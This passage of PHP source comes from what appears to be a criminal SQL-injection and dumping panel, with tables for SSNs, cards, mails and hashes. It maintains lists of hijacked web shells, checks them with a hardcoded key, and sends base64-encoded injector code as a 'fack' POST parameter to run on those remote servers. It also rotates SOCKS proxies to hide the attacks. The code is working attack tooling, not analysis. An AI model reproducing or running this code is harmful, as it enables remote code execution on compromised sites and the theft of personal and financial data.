		$sqlp  = "TRUNCATE TABLE `orders`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `orders`';}
		$sqlp  = "TRUNCATE TABLE `ordersTable_one`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `ordersTable_one`';}
		$sqlp  = "TRUNCATE TABLE `orders_card`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `orders_card`';}
		$sqlp  = "TRUNCATE TABLE `orders_one`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `orders_one`';}
		$sqlp  = "TRUNCATE TABLE `posts`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `posts`';}
		//$sqlp  = "TRUNCATE TABLE `posts_one`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `posts_one`';}
		$sqlp  = "TRUNCATE TABLE `posts_all`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `posts_all`';}
		$sqlp  = "TRUNCATE TABLE `renders`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `renders`';}
		$sqlp  = "TRUNCATE TABLE `renders_one`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `renders_one`';}
		$sqlp  = "TRUNCATE TABLE `settings`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `settings`';}
		$sqlp  = "TRUNCATE TABLE `ssn`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `ssn`';}
		$sqlp  = "TRUNCATE TABLE `sqlmap_links`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `sqlmap_links`';}
		$sqlp  = "TRUNCATE TABLE `starts`";if($this->Post->query($sqlp)){echo 'TRUNCATE TABLE `starts`';}
		
		$this->stop();
		
		
	}
	
	function optimize(){
		
		
		$this->timeStart = $this->start('OPTIMIZEe_baz',1);
		
		$sqlp  = "OPTIMIZE TABLE `bds_one`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `bds_one`';}
		$sqlp  = "OPTIMIZE TABLE `domens`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `domens`';}
		$sqlp  = "OPTIMIZE TABLE `domens_links`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `domens_links`';}
		$sqlp  = "OPTIMIZE TABLE `dumpers_one`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `dumpers_one`';}
		$sqlp  = "OPTIMIZE TABLE `fileds`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `fileds`';}
		$sqlp  = "OPTIMIZE TABLE `fileds_one`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `fileds_one`';}
		$sqlp  = "OPTIMIZE TABLE `hash`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `hash`';}
		$sqlp  = "OPTIMIZE TABLE `logs`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `logs`';}
		$sqlp  = "OPTIMIZE TABLE `mails`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `mails`';}
		$sqlp  = "OPTIMIZE TABLE `mails_dumping`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `mails_dumping`';}
		$sqlp  = "OPTIMIZE TABLE `mails_one`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `mails_one`';}
		$sqlp  = "OPTIMIZE TABLE `multis`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `multis`';}
		$sqlp  = "OPTIMIZE TABLE `multis_one`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `multis_one`';}
		$sqlp  = "OPTIMIZE TABLE `m_users`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `m_users`';}
		$sqlp  = "OPTIMIZE TABLE `orders`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `orders`';}
		$sqlp  = "OPTIMIZE TABLE `ordersTable_one`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `ordersTable_one`';}
		$sqlp  = "OPTIMIZE TABLE `orders_card`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `orders_card`';}
		$sqlp  = "OPTIMIZE TABLE `orders_one`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `orders_one`';}
		$sqlp  = "OPTIMIZE TABLE `posts`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `posts`';}
		$sqlp  = "OPTIMIZE TABLE `posts_one`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `posts_one`';}
		$sqlp  = "OPTIMIZE TABLE `posts_all`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `posts_all`';}
		$sqlp  = "OPTIMIZE TABLE `renders`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `renders`';}
		$sqlp  = "OPTIMIZE TABLE `renders_one`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `renders_one`';}
		$sqlp  = "OPTIMIZE TABLE `settings`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `settings`';}
		$sqlp  = "OPTIMIZE TABLE `ssn`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `ssn`';}
		$sqlp  = "OPTIMIZE TABLE `sqlmap_links`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `sqlmap_links`';}
		$sqlp  = "OPTIMIZE TABLE `starts`";if($this->Post->query($sqlp)){echo 'OPTIMIZE TABLE `starts`';}
		
		
		
		
		
		
		$this->stop();
		 
		
		
	}
	
	function repaire(){
		
		//$this->timeStart = $this->start('repaire_baz',1);
		
		$sqlp  = "REPAIR TABLE `bds_one`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `bds_one`';}
		$sqlp  = "REPAIR TABLE `domens`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `domens`';}
		$sqlp  = "REPAIR TABLE `domens_links`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `domens_links`';}
		$sqlp  = "REPAIR TABLE `dumpers_one`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `dumpers_one`';}
		$sqlp  = "REPAIR TABLE `fileds`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `fileds`';}
		$sqlp  = "REPAIR TABLE `fileds_one`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `fileds_one`';}
		$sqlp  = "REPAIR TABLE `hash`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `hash`';}
		$sqlp  = "REPAIR TABLE `logs`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `logs`';}
		$sqlp  = "REPAIR TABLE `mails`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `mails`';}
		$sqlp  = "REPAIR TABLE `mails_dumping`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `mails_dumping`';}
		$sqlp  = "REPAIR TABLE `mails_one`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `mails_one`';}
		$sqlp  = "REPAIR TABLE `multis`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `multis`';}
		$sqlp  = "REPAIR TABLE `multis_one`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `multis_one`';}
		$sqlp  = "REPAIR TABLE `m_users`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `m_users`';}
		$sqlp  = "REPAIR TABLE `orders`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `orders`';}
		$sqlp  = "REPAIR TABLE `ordersTable_one`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `ordersTable_one`';}
		$sqlp  = "REPAIR TABLE `orders_card`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `orders_card`';}
		$sqlp  = "REPAIR TABLE `orders_one`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `orders_one`';}
		$sqlp  = "REPAIR TABLE `posts`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `posts`';}
		$sqlp  = "REPAIR TABLE `posts_one`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `posts_one`';}
		$sqlp  = "REPAIR TABLE `posts_all`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `posts_all`';} 
		$sqlp  = "REPAIR TABLE `renders`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `renders`';}
		$sqlp  = "REPAIR TABLE `renders_one`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `renders_one`';}
		$sqlp  = "REPAIR TABLE `settings`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `settings`';}
		$sqlp  = "REPAIR TABLE `ssn`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `ssn`';}
		$sqlp  = "REPAIR TABLE `sqlmap_links`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `sqlmap_links`';}
		$sqlp  = "REPAIR TABLE `starts`";if($this->Post->query($sqlp)){echo 'REPAIR TABLE `starts`';}
		//$this->stop();
		
        
		
		
	}
	
	function update_all(){//перезапускает потоки при скачке
		
		if($this->Post->query("UPDATE  `multis` SET  `get` ='3' WHERE  `get` ='1'")){
			
			$this->d('update_all');
		}
		
	}
	
	function update_filed(){
		$poles = $this->Filed->query("SELECT * FROM  `fileds`");
		echo 123;
		
		if(count($poles)>0){
			
			//$this->timeStart = $this->start('update_filed',1);
		}else{
			//$this->stop();
			die();
		}
		
		$r = rand(1,100);
		//$this->logs("update- № $r",__FUNCTION__);
		
		
		
		foreach ($poles as $pole){
			$ku = $pole['fileds']['id'];
			$this->d("UPDATE `posts` SET filed_id=".$ku."  WHERE id=".$pole['fileds']['post_id']);
			
			if($this->Post->query("UPDATE `posts` SET filed_id=".$ku."  WHERE id=".$pole['fileds']['post_id'])){
				echo $pole['fileds']['post_id'].' - ok<br>';
				
			}
		}
		//$this->stop();
		
	}
	
	function up($id){
		

		if($this->Post->query("UPDATE  `fileds` SET  `get` ='1',`multi`=1,`up`=1 WHERE `id` =".$id))
		{
			$this->d('filed up ok -'.$id);
			
			if($this->Post->query("UPDATE  `multis` SET  `get` =1,`prich`='repezapusk',`dok`=0 WHERE `filed_id` =".$id))
			{
				$this->d('multis up ok -'.$id);
			}
			
		}
	}
	
	
	//////////////ФУНКЦИИ ТЕСТИРОВАНИЯ ПРОКСИ И ШЕЛОВ//////////////
	
	
	function evalpredtest(){    //тестирование шелов предварительное просто
		
			$this->timeStart = $this->start('evalpredtest',1);
	
			$original = file('evalpredshelllist.txt');
			$original = array_unique($original);
			shuffle($original);
			
			
			//$this->d($original,'$original');
			
		
		
		
		foreach($original as $be)
		{
				$be = str_replace('http://','',$be);  
			
				
			
			
			if(strlen($be) >5)
			{
				
				$be1 = str_replace('.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG','.php',$be);
				$be1 =  trim($be1);
				$be = $be1.'?q=1';
				#$this->d($be);
				
				if(!empty($be))
				{
				
					$ctx = stream_context_create(array('http'=>
					array(
						'timeout' => 5,  
					)
				));

				
				
					$ch = file_get_contents('http://'.$be,false,$ctx);
				
				
				
					if($ch==200 or $ch=='200'){
						$this->d('http://'.$be);
						$new[] = $be1;
						}
						
					//exit;	
						
				flush();

				}		
				
			}
			
		}
		
		
		//unlink('shelllist.txt');
		unlink('checkshells.txt');
		
		$fp = fopen ('checkshells.txt', "a+");
		
		//$fp22 = fopen ('shelllist.txt', "a+");

		//$this->d($new,'new __');


		$new =  array_unique($new);

		


		foreach ($new as $output)
		{
			fwrite($fp, $output."\r\n");
			//fwrite($fp22, $output."\r\n");
			
		}

		fclose($fp);
		//fclose($fp22);
		
		$this->stop();
	}
	
	function badcheksshells($url=''){//чек шелов на существование
	
	
	
	
	
		
		//$domen = $url;
		
		$hal_admin = file('shelllist.txt');
		
		
		$date = date('Y-m-d h:i:s');
		
	
		
		foreach ($hal_admin as $val)
		{
			
			
				$val = str_replace('.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG','.php',$val);
			
				$be1 =  trim($val);
				$bel = $be1.'?q=1';
			
				$urls[] = $bel;
			
		}
		
		//$this->d($urls,'zapusk poiska admi nok'); 
		//exit;
		
		$cmh = curl_multi_init();
		$tasks = array();
		$i=0;
		
		
		$urls = array_unique($urls);
		
		$count_urls = count($urls);
		$this->d($count_urls,'$count_urls ISHODNO ');
		
	
		
		$file = 'shelllist_new.txt';	
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/$file";
		$fp = fopen ($ff, "w");
		
		
		
		//$this->d($ff,'ff');
		
		//if($count_urls > 100){
			
			$kk = 50;
		//}else{
		//	
		//	$kk = $count_urls;
		//}
		
		
		
		
		
		for($i=0;$i< $kk;$i++)
		{
			
			
			$this->workup();
			//echo $i.' - i<br>';
			
			
			$urlnew = array_shift($urls);
			
			$ch = $this->streampars($urlnew,$this->time_200,0);
			
			//$this->d($ch);
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
		}
		
		
		
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				do 
				{
					////
					
					///////
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						//$status=curl_getinfo($ch,CURLINFO_HTTP_CODE);
						
						//$this->d($status,'status');
						
						//$this->d($ch,'ch');

						$url = array_search($ch, $tasks);
						
						

						$tasks[$url] = curl_multi_getcontent($ch);
						
						
						//exit;
						
						if($tasks[$url] !='')
						{
							
							
							
							
							if($tasks[$url] ==200 or $tasks[$url]=='200')
							{
									
							//	$this->d($tasks[$url],'$tasks[$url]');
							
							
								$url = str_replace('?q=1','',$url);
								//$this->d($url,'url');
							
								
								if($url !=''){
									$good_urls[]=$url;
									//$this->d($url,'$url');
									fwrite($fp,$url."\r\n");
									 
								}
								
							}//else{
								//fwrite($fp2,$url."\r\n");
							//}
							
						}//else{
							
							//fwrite($fp2,$url."\r\n");
						//}
						
						
					//
						
						
						
						

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						
						
						if(count($urls)>0)
						{
							
							
							$urlnew = array_shift($urls);
							
							
							if($urlnew !=''){
								
								//echo $urlnew. ' -  zapusk dopolnitelno<br>';	
								$ch = $this->streampars($urlnew,$this->time_200,0);

												
								$tasks[$urlnew] = $ch;
								//$this->d($ch);		
								curl_multi_add_handle($cmh, $ch);
							}
							
							
							
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

		if($kuku !='yes'){
			
			//$this->d('ne nashol admonku ');
		}

		curl_multi_close($cmh);

		return  $good_urls;
		//copy($_SERVER['DOCUMENT_ROOT']."/app/webroot/shelllist_new.txt", $_SERVER['DOCUMENT_ROOT']."/app/webroot/shelllist.txt");
		

	}	 
	
	
	
	
	function shelltest($good = null){ //тестирование шелов из админки
		$this->evaltest($good);
		
		$original = file('goodshelllist.txt');
		
		if($this->local_shells==true){
				
		}else{
			$original = array_unique($original);
		}
		
		//$original = array_filter($original);
		//shuffle($original);
		//echo 'bez testa shelli';
		$this->serv = $original;
		
		$this->set('serv',$this->serv);
		
	}
	
	function checkblackshells(){
		
		//return true;
		
		$black =  file_get_contents('blackshell.txt');
		$shells = file('shelllist.txt');
		$goods =  file('goodshelllist.txt');
		
	
		$fp2 = fopen ('goodshelllist.txt', "w+");
	
		foreach ($goods as $str)
		{
                $str = str_replace(array('http://','https://'),'',$str);
                $url = parse_url('http://'.$str);
				flush();
				$domen = $url['host'];
            
            
				if(!strstr($black, $str))
				{
					fwrite($fp2, $str);
				}
		}
		
		$fp22 = fopen ('shelllist.txt', "w+");
		
		
		foreach ($shells as $str2)
		{
                $str2 = str_replace(array('http://','https://'),'',$str2);
				$url = parse_url('http://'.$str2);
				flush();
				$domen = $url['host'];
				
				if(!strstr($black, $domen))
				{
					fwrite($fp22, $str2);
				}
		}
		
		
		
		
		
		fclose($fp2);
		fclose($fp22);
		
		echo 'ok';
		
	}
	
	
	function evaltest($good = 'no',$fun){    //тестирование шелов
		
		$kkk = $this->check_shell_limit;
		//$this->checkblackshells(); 
		
		if($good =='yes')
		{
			
			
			
			if($this->local_shells==true){
					
				$original = file('local_shells.txt');
				$this->serv = $original;
				//$this->d($this->serv,'$this->serv');
				return ;	
			}
			else{
				
				$original = file('shelllist.txt');
				$original = array_unique($original);
				//$original = array_filter($original);
				//shuffle($original);
				
			}
			
			

		}
		else
		{
			if((time()-intval(filemtime('goodshelllist.txt'))>20500) or count(file('goodshelllist.txt')) ==0)
			{
				
				
				if($this->local_shells==true){
					
					$original = file('local_shells.txt');
					$this->serv = $original;
					//$this->d($this->serv,'$this->serv');
					return ;	
					
				}
					$original = file('shelllist.txt');
					$original = array_unique($original);
					//$original = array_filter($original);
					//shuffle($original);
					//array_splice($original, $kkk);
				
					//return ;	
					
				
			
				
					
					

			}else
			{
								
				
				
				
				if($this->local_shells==true){
					
					$original = file('local_shells.txt');
					$this->serv = $original;
					//$this->d($this->serv,'$this->serv');
					return ;
					
				}
				
					$original = file('goodshelllist.txt');
					$original = array_unique($original);
					//$original = array_filter($original);
					//shuffle($original);
					//array_splice($original, $kkk);
					$this->d('bez testa shelli');
					$this->serv = $original;
					return ;	
			}
		}
		
		
		$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		$injectorfile = file_get_contents($filename);
		$code = str_replace('URLURL', 'URLURL', file_get_contents('ololo.php'));
		$conf = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/config.php');
		$conf = str_replace(array('<?php','?>'), '', $conf);
		$injconf = str_replace('include($_SERVER["DOCUMENT_ROOT"]."/config.php");', $conf , $injectorfile);
		$this->code = str_replace(array('<?php','?>'), '', $injconf.$code);
		
		
		
		
		//$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		//$injectorfile = file_get_contents($filename);
		//$code = str_replace('URLURL', 'URLURL', file_get_contents('ololo.php'));
		//$this->code = str_replace(array('<?php',''), '', $injectorfile.$code);   
		
		
		//$this->d($this->code,'$this->code ololo');
		//exit;
		
		
		
		$original = $this->badcheksshells();
		
		
		$this->d(count($original),'vsego normal na check');
		
		array_splice($original, $kkk);
		
		
		$new_count_shells = count($original);
		
		
		$this->d($new_count_shells,'$this->check_shell_limit BUDET CHEKATSYA POSLE LIMIT');
		
		//$this->serv = $original;
		//exit;
		
		
		$ev = file('blackshell.txt');
		
		$ev = array_unique($ev);
		
		$f2=fopen('blackshell.txt','w');
		
		foreach ($ev as $item){
			fputs($f2,$item);
		}
		fclose($f2);
		
		//exit;
		
		
		
	
		
		
		$black_shells = file_get_contents('blackshell.txt');
		
		//for ($i=0;$i<count($original);$i++)
		for ($i=0;$i<$new_count_shells;$i++)
		{
			
			$kksh = str_replace('http://','',array_shift($original));
			
			//echo $i.'<br>';
			
			$data = parse_url($kksh);
			$host = $data['path'];
			if(strlen($kksh) >5 AND !preg_match('/'.$host.'/',$black_shells))
			{
				//$this->d($kksh,'$kksh GOOD');

				$kksh = str_replace('.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG','.php',$kksh);
				$kksh = trim($kksh).'?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG';
				$sssss[$i] = $kksh;
			}else{
				//$this->d($host,'$host BAD');
				
			}
			
			
			
			//if(count($original) == 0)break;
		}
		
	
		 
		////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		$cmh = curl_multi_init(); 

		$tasks = array();
		
		$count_serv = count($sssss);

		$this->d($count_serv,'BEZ SHELLOV V BLACKLIST' );
		
		//exit;
		//for($i=0;$i<$count_serv;$i++)
		
		for($i=0;$i<50;$i++)
		{
			

				$url = array_shift($sssss);
				$url = trim($url);
				
				//$this->d($sssss[$i],'$iii');
				$ch = $this->evallife($url);
				
				
				//$tasks[$sssss[$i]] = $ch;
				$tasks[$url] = $ch;
				
				
				//$this->d($ch,"$i".' ch');
				//$this->d($tasks[$this->serv[$i]]);
				
				curl_multi_add_handle($cmh, $ch);
			
			
		}
		

		$active = null;
		
		
		
		$a = 0;
		$b = 0;
		$i=0;
		
		do 
		{
			//sleep(1);
			$mrc = curl_multi_exec($cmh, $active);			
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);
		
		

		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				
				
				do 
				{
					
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);
					
					
					if ($active2<>$active)
					{
						//echo '<br><br>curl_multi_exec: '.$mrc.',running: '.$active.'<br>';
						//echo "info: <br>";
						//$this->d($info);
						
					}
					$active2=$active;
					
					
					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$url = array_search($ch, $tasks);
						
						if ($info['result']==0) //Проверка на ошибки
						{
							$tmp = curl_multi_getcontent($ch);
							//$tasks2[$url] = curl_multi_info_read($ch);
							//$this->d($tmp,"$url");
						}else
						{
							$err     = curl_errno($ch);
							$errmsg  = curl_error($ch);
							$header  = curl_getinfo($ch);
							if ($err<>0)
							{
								echo 'Страница ' .$header['url'].' не была загружена из-за ошибки http_code: '.$header['http_code'].' err:' .$err.', errmsg: '.$errmsg;
							}
						}
						
						
						$get = $tmp;

						
						if(strstr($tmp, 'ololo'))
						{
							
							$dd = explode("||", $get);
							
							$this->d($get,'NORMALNO');
							
							if(trim($dd[1]) !='fuck you')
							{
								$i=$i++;
								$new[]= $dd[1];
							}

						}else{
							//$this->d($get,'HRENOVO');
							
						}
						
						curl_multi_remove_handle($cmh, $ch);	
						curl_close($ch);
						
						
						if(count($sssss)>0)
						{
							
							
								$url = array_shift($sssss);
								$url = trim($url);
								
								
								$this->d($url,'zapusk dopolnitelno count($sssss) - '.count($sssss));
								
								//$this->d($sssss[$i],'$iii');
								$ch = $this->evallife($url);
								
								
								//$tasks[$sssss[$i]] = $ch;
								$tasks[$url] = $ch;
								
								
								//$this->d($ch,"$i".' ch');
								//$this->d($tasks[$this->serv[$i]]);
								
								
								
								
								//$chc = $this->evallife(trim($kksh));
								//$tasks[$kksh] = $chc;
								curl_multi_add_handle($cmh, $ch);
											
							
						}
					}
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
			
			$b++;
		}

		curl_multi_close($cmh);

		$this->serv = $new;
		
		
		$this->d(count($new),'new'); 

		unlink('goodshelllist.txt');
		$fp = fopen ('goodshelllist.txt', "a+");

		$fp2 = fopen ('goodshelllist2.txt', "a+");

		
		//$this->d($new,'NE UNIK');
		if($this->local_shells==true)
		{
			
		}
		else
		{
			$new =  array_unique($new);
		}
	

		$this->d(count($new),'new array_uniqu'); 

		$this->d($new);

		
		//$new = array_filter ($new );

		foreach ($new as $output)
		{
			fwrite($fp, $output."\r\n");
			fwrite($fp2, $output."\r\n");
		}

		fclose($fp);
		fclose($fp2);
		
		//$this->checkblackshells();

	}

	function evallife($url,$type = CURLPROXY_SOCKS5){//тестирование шелов <-- дочерняя функция
		
		
		
		
			//$this->d($url,'$url');
		
		
		$ch = curl_init($url);
		
	
		
		if($this->evallife =='' or $this->evallife==false){
			
			$time = 60;
		} else{
			
			$time = $this->evallife;
		}
		
		
		curl_setopt($ch, CURLOPT_URL, $url);
		$agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.7.12) Gecko/20050919 Firefox/1.0.7';  

		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, 0); //Включать или не включать header 
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
		curl_setopt($ch, CURLOPT_MAXCONNECTS, 3);
		curl_setopt($ch, CURLOPT_TIMEOUT, $time);			
		curl_setopt($ch, CURLOPT_ENCODING, "UTF-8");
		curl_setopt($ch, CURLOPT_POST, 1);
		
		

		/**$postdata = 'fack='.urlencode(base64_encode("error_reporting(0); if(!@set_time_limit(0)){
	if(@function_exists('ini_set'))@ini_set('max_execution_time',0);
	elseif(@function_exists('ini_alter'))@ini_alter('max_execution_time',0);
	else die('<!--Can not set_time_limit(0)-->');

	if(@function_exists('ini_get')){
		if(@ini_get('max_execution_time')!='0')echo('<!--Can not set_time_limit(0)-->');
	}else die('<!--Maybe can not set_time_limit(0)-->');
}
sleep(30);
		//$str = 1;
		//for($i=0;$i<30000;$i++)
		//{
			//$str = $str+$i;
		//}
echo '||".$url."|| ololo';"));
**/
		$codec = str_replace('URLURL', $url,$this->code);
		
		$postdata = 'fack='.urlencode(base64_encode($codec));


		$headers["Content-Length"] = strlen($postdata);
		$headers["User-Agent"] = "Curl/1.0";	
		
		$headers["Content-Length"] = strlen($postdata);
		$headers["User-Agent"] = "Curl/1.0";
		
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		
		//$buffer = curl_exec($ch);	
		//print_r($buffer);
		//flush();
		
		
		return $ch;
		
		
		

	}
	
	function proxyCheck($ku=false){
		
		
		
		if($this->proxy_enable)
		{
            
            if($this->debug_proxy){
               $this->d('SBORKA RABOTAET CHEREZ PROXY'); 
            }
			
			//чекаем прокси, будет пул из 10
			$this->proxy_all();
			$this->mysqlInj ->proxy_inj($this->valid_socks);
		}
		
	}
	
	function proxy_one(){ //отдаёт один прокси
		
		
		//print_r($this->proxy_enable);
		//exit;
		$this->s();//замер времени
		
		//$res = file_get_contents($this->proxy_url);
		//file_put_contents('proxy.txt',$res);
		
		$tmp = file('proxy.txt');
		$socks = array_unique($tmp);
		shuffle($socks);
		
		
		$b = 0;
		foreach($socks as $s)
		{
			$r = $this->check($s);
			if($r !== false)
			{
				$this->valid_socks[] = $r;	
				break;
			}else
			{
				$b++;
				if($b == 10)break;
				continue;
			}
		}
		
		if(count($this->valid_socks) > 0)
		{
			shuffle($this->valid_socks);
			
			
			if($this->proxy_check_full ==true)
			{
				
				if($this->proxy_url_full_check ==''){$this->proxy_url_full_check	='post::http://testphp.vulnweb.com/userinfo.php?uname=test&pass=test';}
				
				if($this->proxy_answer ==''){$this->proxy_answer	='mysql_fetch_array';}
				
				
				$url = $this->proxy_url_full_check;
				$this->mysqlInj = new InjectorComponent();

				
				$this->mysqlInj ->proxy_inj($this->valid_socks);
				
                $this->mysqlInj->proxy_no_check =true;
				$res = $this->mysqlInj->inj_test($url);	
                $this->mysqlInj->proxy_no_check =false;
				if($this->debug_proxy){
                    
                    $this->d($res,'$res');
                }
				
				
				if(trim($res) ==$this->proxy_answer){
                    if($this->debug_proxy){
						$this->d('function proxy_GOOD PROSHEL FULL PORVERKU  !<br>');
						$this->d($this->valid_socks);
                    }
						file_put_contents('proxy_good.txt','good');
					
				}else{
                    if($this->debug_proxy){
                        $this->d( 'function proxy_BAD<br>');
                    }
					file_put_contents('proxy_good.txt','bad');
				}
				
			}else
			{
                if($this->debug_proxy){
                    echo 'function proxy_GOOD!<br>';
                    print_r($this->valid_socks);
                }
			
				file_put_contents('proxy_good.txt','good');
				
			}
			
			
			
		}else
		{
			file_put_contents('proxy_good.txt','bad');
			$this->stop();
			$this->d('proxy net!!!','proxy');
			die('net proxy');
		}
		
		
		
		$this->p('END_TIME');
	}
	
	function proxy_all(){ //10 прокси рабочих выбирает
		
		$this->s();//замер времени
		
		
		$file = "proxy.txt";
		$now_time = time();
		$time = 0; 
		
		if(file_exists($file) and (filesize($file) > 10)) { 
			$time = filemtime($file); 
		} 
		
		
		if(($now_time - $time) > 300) 
		{ 
			 if($this->debug_proxy){
                $this->d('KACHAEM proxy');
             }
			$res = file_get_contents($this->proxy_url);
			

			$tmp = file('proxy.txt');
			if(count($tmp) < 1)
			{
				$this->stop();
				die('NOT DOWNLOAD PROXY!!');
				
			}
			$tmp = array_unique($tmp);
			shuffle($tmp);
			
		}else{
			$this->d('bez skachivaniya');
			$tmp = file('proxy.txt');
			$socks = array_unique($tmp);
			shuffle($socks);
			
		}
		
		$socks = array_slice($tmp, 0, 25); 
		
		
		$count = 10;
		$i=1;
		$b = 0;
		
		foreach($socks as $s)
		{
			$r = $this->check($s);
			if($r !== false)
			{
				$this->valid_socks[] = $r;
				
				if($i == $count)break;
				$i++;
				
			}else
			{
				$b++;
				if($b == 50)break;
				continue;
			}
		}
		
		if(count($this->valid_socks) > 0)
		{
			shuffle($this->valid_socks);
            if($this->debug_proxy){
                $this->d($this->valid_socks,'function proxy_all_good PREDVARITELNYA');
            }
			
			
			
			if($this->proxy_check_full ==true)
			{
				
				if($this->proxy_url_full_check ==''){$this->proxy_url_full_check	='post::http://testphp.vulnweb.com/userinfo.php?uname=test&pass=test';}
				
				if($this->proxy_answer ==''){$this->proxy_answer	='mysql_fetch_array';}
				
				
				$url = $this->proxy_url_full_check;
				$this->mysqlInj = new InjectorComponent();

				
				$this->mysqlInj ->proxy_inj($this->valid_socks);
				
				$this->mysqlInj->proxy_no_check =true;
				$res = $this->mysqlInj->inj_test($url);	
                $this->mysqlInj->proxy_no_check =false;
				
				//$this->d($res,'$res');
				
				if(trim($res) ==$this->proxy_answer){
                      if($this->debug_proxy){
						$this->d('function proxy_GOOD PROSHEL FULL PORVERKU  !<br>');
						$this->d($this->valid_socks);
                      }
			
						file_put_contents('proxy_good.txt','good');
					
				}else{
					echo 'function proxy_BAD<br>';
					file_put_contents('proxy_good.txt','bad');
				}
				
			}else
			{
				echo 'function proxy_GOOD!<br>';
				print_r($this->valid_socks);
			
				file_put_contents('proxy_good.txt','good');
				
				
			}
			
			$this->head_enable = false; 
			
			
